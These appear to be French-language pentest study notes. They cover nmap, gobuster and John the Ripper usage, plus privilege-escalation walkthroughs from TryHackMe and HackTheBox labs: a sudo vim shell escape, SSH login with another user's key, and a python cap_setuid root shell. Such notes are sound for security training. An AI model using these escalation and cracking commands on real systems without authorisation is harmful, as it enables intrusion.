# (logo pentest) Pentest

## Pentest AD
[Pentest AD MAP](https://www.xmind.net/m/5dypm8/)

## Outils

### NMAP

Suffixes : 
* -sV : affiche la version des services existants sur les ports
* -sC : affiche les scripts par défaut qui sont activés sur les ports

Scan simple et rapide : 
* sudo nmap -sS -T5 <ip>

Exemples : 
* N°1 : TryHackMe -> [Ice Room](https://tryhackme.com/room/ice)

    ```$ sudo nmap -sS -Pn -sV 10.10.188.70```

* N°2 : TryHackMe -> [Ice Room](https://tryhackme.com/room/ice)

    ```$ sudo nmap -sS -sC 10.10.188.70```

### Gobuster

Source : [gobuster](https://www.le-hacking.fr/brute-force-url-gobuster/)

gobuster -h : ```$ gobuster dir -u http://[adresse IP]:[Port] -w [wordlists]```

Exemples :
<br/>```./gobuster dir -u http://10.10.52.129/ -w /usr/share/wfuzz/wordlist/general/common.txt```

### John2ripper

```$ john-the-ripper --wordlist=Outils/wordlist/rockyou.txt id_rsa_basic_hash.txt ```

Permet de retrouver la passphrase pour se connecter en ssh à un user particulier.
## Méthodes
### Escalade de privilège

Exemple : 
* N°1 : TryHackMe -> [SimpleCTF Room](https://tryhackme.com/room/simplectf)

    <br/>```$ sudo -l```
    <br/>ans : User mitch may run the following commands on Machine:
    <br/>ans : (root) NOPASSWD: /usr/bin/vim
    <br/>```$ sudo vim -c ':!/bin/sh'```
    <br/>```# ^[[2;2R^[]11;rgb:3030/0a0a/2424^G```
    <br/>ans : /bin/sh: 1: ot found
    <br/>ans : /bin/sh: 1: 2R: not found
    <br/>```# whoami```
    <br/>ans : root

* N°2 : TryHackMe -> [BasicPentesting Room](https://tryhackme.com/room/basicpentestingjt)
    <br/>```ssh -i /home/<user>/.ssh/id_rsa kay@<ip>```
    <br/> Cette ligne permet de se connecter en ssh à un user par l'intermédiaire d'un autre user présent sur la même machine.

* N°3 : HackTheBox -> [CAP Room](https://app.hackthebox.eu/machines/Cap)

nathan@cap:~$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
nathan@cap:~$/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'